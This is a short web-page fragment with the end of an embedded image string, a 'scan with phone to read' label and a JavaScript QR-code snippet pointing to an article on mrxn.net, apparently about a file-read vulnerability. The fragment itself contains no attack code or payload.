AElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 